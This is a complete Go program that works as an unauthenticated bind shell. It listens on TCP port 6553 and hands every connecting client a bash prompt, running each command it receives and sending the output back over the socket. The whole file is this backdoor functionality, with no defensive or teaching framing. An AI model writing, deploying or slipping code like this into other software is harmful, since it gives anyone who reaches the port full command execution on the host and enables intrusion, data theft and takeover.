package main

import "fmt"
import "net"
import "os"
import "os/exec"
import "os/user"
import "strings"

func handleError(err error) int {
	if err != nil {
		return 1
	}
	return 0
}

func spawnShell(conn net.Conn) {
	addrInfo := strings.Split(conn.RemoteAddr().String(), ":")
	ip := addrInfo[0]

	defer conn.Close()
	currentUser, err := user.Current()
	if handleError(err) == 1 {
		fmt.Fprintf(conn, "🔴 [ERROR] Unable to get current user: %v\n", err)
		return
	}
	username := currentUser.Username
	hostname, err := os.Hostname()
	if handleError(err) == 1 {
		return
	}

	fmt.Printf("🟢 [SUCCESS] Received connection from %v\n", ip)
	conn.Write([]byte("🦊 Connection established!\n"))

	dir, err := os.Getwd()
	if handleError(err) == 1 {
		fmt.Fprintf(conn, "🔴 [ERROR] Unable to get current directory: %v\n", err)
		return
	}

	for {
		prompt := fmt.Sprintf("%s@%s:%s$ ", username, hostname, dir)
		conn.Write([]byte(prompt))
		input := make([]byte, 1024)
		n, err := conn.Read(input)
		if handleError(err) == 1 {
			fmt.Printf("🔴 [ERROR] Could not read input from client: %v\n", err)
			return
		}

		command := strings.TrimSpace(string(input[:n]))

		if command == "exit" {
			conn.Write([]byte("👋 Bye!\n"))
			fmt.Printf("🟢 [SUCCESS] Connection from %v successfully closed\n", ip)
			return
		}

		if strings.HasPrefix(command, "cd ") {
			path := strings.TrimSpace(command[3:])
			err := os.Chdir(path)
			if handleError(err) == 1 {
				fmt.Fprintf(conn, "🔴 [ERROR] Unable to change directory: %v\n", err)
			} else {
				dir, _ = os.Getwd()
			}
			continue
		}

		dir, err = os.Getwd()
		if handleError(err) == 1 {
			fmt.Printf("🔴 [ERROR] Could not update directory: %v\n", err)
		}

		cmd := exec.Command("/bin/bash", "-c", command)
		cmd.Dir = dir
		cmd.Stdout = conn
		cmd.Stderr = conn
		if err := cmd.Run(); handleError(err) == 1 {
			fmt.Fprintf(conn, "🔴 [ERROR] Unable to execute commands: %v\n", err)
		}
	}
}

func listen(PORT string) {
	ln, err := net.Listen("tcp", ":"+PORT)
	if handleError(err) == 1 {
		fmt.Printf("🔴 [ERROR] Unable to listen on specified port: %v\n", err)
		return
	} else {
		fmt.Printf("🟡 [IDLE] Listening on port %s\n", PORT)
	}

	for {
		conn, err := ln.Accept()
		if handleError(err) == 1 {
			fmt.Printf("🔴 [ERROR] Unable to establish connection: %v\n", err)
		} else {
			fmt.Printf("🟢 [SUCCESS] Connection established\n")
		}
		go spawnShell(conn)
	}
}

func main() {
	listen("6553")
}
